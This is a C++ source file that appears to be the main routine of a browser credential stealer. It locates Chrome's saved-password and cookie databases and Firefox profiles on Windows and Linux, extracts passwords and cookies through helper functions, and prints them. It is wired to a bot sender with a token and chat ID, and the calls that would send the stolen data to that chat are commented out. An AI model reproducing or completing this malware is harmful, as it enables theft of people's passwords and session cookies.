#include <experimental/filesystem>
#include <iostream>
#include <string>
#include <sstream>
#include <exception>

#include <cstdio>
#include <cstdlib>

#include "sender.hpp"
#include "tools.hpp"
#include "project-612.hpp"

int main()
{
    try
    {
        sqlite3 *db;

        const string TOKEN("");    //put your bot token here
        int64_t ChatID = 12345;         //put your chat id here

        Sender bot_sender(TOKEN);

#if defined(__linux__)
        string chrome_pass_path = "~/.config/google-chrome/Default";
        string firefox_pass_path = "~/.mozilla/firefox/<profilename>";
#elif defined(__WIN64__)
        TCHAR username[255];
        DWORD username_len = 255;
        GetUserName((TCHAR*)username, &username_len);

        string chrome_pass_path = _T("C:\\Users\\");
        chrome_pass_path += username;
        chrome_pass_path += _T("\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data");

        string chrome_cookies_path = _T("C:\\Users\\");
        chrome_cookies_path += username;
        chrome_cookies_path += _T("\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies");

        string firefox_pass_path = _T("C:\\Users\\");
        firefox_pass_path += username;
        firefox_pass_path += _T("\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\");
#endif
        if(experimental::filesystem::exists(chrome_pass_path))
        {
            cout<<chrome_pass_path<<endl;
            cout<<"exists"<<endl;

            stringstream pass;
            
            int rc = sqlite3_open(chrome_pass_path.c_str(), &db);
            if(rc )
            {
                cout<<"DB Error: "<<sqlite3_errmsg(db)<<endl;
                //bot_sender.send(ChatID, "DB Error: " + sqlite3_errmsg(db));
                sqlite3_close(db);
            }
            else
            {
                pass = get_chrome_pass(db);
                //bot_sender.send(ChatID, pass.str());
                cout<<pass.str();
            }
        }

        if(experimental::filesystem::exists(chrome_cookies_path))
        {
            cout<<chrome_cookies_path<<endl;
            cout<<"exists"<<endl;

            stringstream cookies;

            int rc = sqlite3_open(chrome_cookies_path.c_str(), &db);
            if(rc )
            {
                cout<<"DB Error: "<<sqlite3_errmsg(db)<<endl;
                //bot_sender.send(ChatID, "DB Error: " + sqlite3_errmsg(db));
                sqlite3_close(db);
            }
            else
            {
                cookies = get_chrome_cookies(db);
                //bot_sender.send(ChatID, cookies.str());
                cout<<cookies.str();
            }
        }

        if(experimental::filesystem::exists(firefox_pass_path))
        {
            cout<<firefox_pass_path<<endl;
            cout<<"exists"<<endl;
            //bot_sender.send(ChatID, "ff exists");
        }
    }
    catch(exception &e)
    {
        cout<<"error"<<endl;
        cerr<<e.what()<<endl;
    }

    return 0;
}
